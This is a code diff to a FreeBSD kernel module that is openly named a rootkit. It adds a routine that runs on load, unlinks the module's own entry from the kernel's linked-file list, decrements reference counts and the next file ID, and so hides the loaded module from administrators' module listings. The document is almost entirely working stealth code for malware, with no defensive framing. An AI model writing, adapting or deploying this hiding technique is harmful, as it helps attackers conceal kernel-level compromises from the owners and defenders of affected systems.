@@ -22,6 +22,18 @@
 #include <sys/module.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/lock.h>
+#include <sys/mutex.h>
+#include <sys/sx.h>
+
+static int remove_linker_file(char * name);
+static void decrement_kernel_image_ref_count(void);
+
+
+extern struct sx kld_sx;
+extern linker_file_list_t linker_files;
+extern int next_file_id;
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -29,7 +41,8 @@ load(struct module *module, int cmd, void *arg)
         switch(cmd) {
         case MOD_LOAD:
                 LOGI("[rootkit:load] Rootkit loaded.\n");
-                break;
+                remove_linker_file("rootkit.ko");
+				break;
         case MOD_UNLOAD:
                 LOGI("[rootkit:load] Rootkit unloaded.\n");
                 break;
@@ -46,5 +59,34 @@ static moduledata_t rootkit_mod = {
         load,
         NULL
 };
+
+
+static int remove_linker_file(char * name){
+	struct linker_file  *lf;
+	int result = 1;
+
+	mtx_lock(&Giant);
+	sx_slock(&kld_sx);
+	decrement_kernel_image_ref_count();
+
+	LOGI("Attempting to remove linker file %s\n", name);
+	TAILQ_FOREACH(lf, &linker_files, link){
+		LOGI("Checking %s\n", lf->filename);
+		if(strcmp(lf->filename, name) == 0){
+			next_file_id--;
+			TAILQ_REMOVE(&linker_files,lf,link);
+			result = 0;
+			break;
+		}
+	}
+
+	sx_unlock(&kld_sx);
+	mtx_unlock(&Giant);
+	return result;
+}
+
+static void decrement_kernel_image_ref_count(void){
+	(&linker_files)->tqh_first->refs--;
+}
 
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
